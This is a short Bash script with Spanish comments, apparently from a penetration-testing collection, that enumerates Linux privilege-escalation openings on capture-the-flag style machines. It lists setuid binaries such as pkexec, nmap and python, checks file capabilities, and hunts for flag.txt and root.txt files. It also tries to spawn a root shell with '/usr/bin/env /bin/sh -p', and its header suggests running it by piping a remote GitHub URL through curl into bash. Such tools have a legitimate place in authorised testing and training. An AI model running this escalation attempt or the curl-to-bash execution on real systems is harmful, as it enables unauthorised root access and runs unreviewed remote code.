#!/bin/bash

# Ejecución remota:
#  curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/3-Elevate/CheckPriv.sh | bash

fPermisosSuid() {

  echo -e "\nBuscando binarios con bit setuid..."
  echo -e "=====================================\n"

  vResultado=$(find / -perm -4000 2>/dev/null)

  echo -e "$vResultado" | grep -E 'pkexec|nmap|python'

}

fCapabilities() {

  echo -e "\nBuscando binarios con capacidades..."
  echo -e "======================================\n"

  vResultado=$(getcap -r / 2>/dev/null)

  echo -e "$vResultado" | grep -E 'python|ruby'

}

fBuscarFlags() {

  tput cnorm
  echo -ne "\nQuieres buscar flag.txt? [S/N]: "
  read vOpcion

  if [ "$vOpcion" = "s" ] || [ "$vOpcion" = "S" ]; then
    tput civis

    echo -e "\nBuscando flags.txt..."
    echo -e "======================\n"
    vFlags=$(find / -name "flag*.txt" 2>/dev/null)
    echo -e "$vFlags"

    echo -e "\nBuscando flags root..."
    echo -e "========================\n"
    vRootFlags=$(find / -name "root.txt" 2>/dev/null)
    echo -e "$vRootFlags"

    for vNum in 1 2 3; do
      vResultado=$(find / -name "root${vNum}.txt" 2>/dev/null)
      if [ -n "$vResultado" ]; then
        echo -e "$vResultado"
      fi
    done
  fi

}

fEnv() {

  echo -e "\nIntentando ser root con env..."
  echo -e "===============================\n"

  /usr/bin/env /bin/sh -p 2>/dev/null

  if [ "$(id -u)" -ne 0 ]; then
    echo -e "No se pudo"
  else
    echo -e "Vulnerabilidad encontrada"
    echo -e "Comando: /usr/bin/env /bin/sh -p"
  fi

}

clear
tput civis

fPermisosSuid
fCapabilities
fEnv
fBuscarFlags

tput cnorm
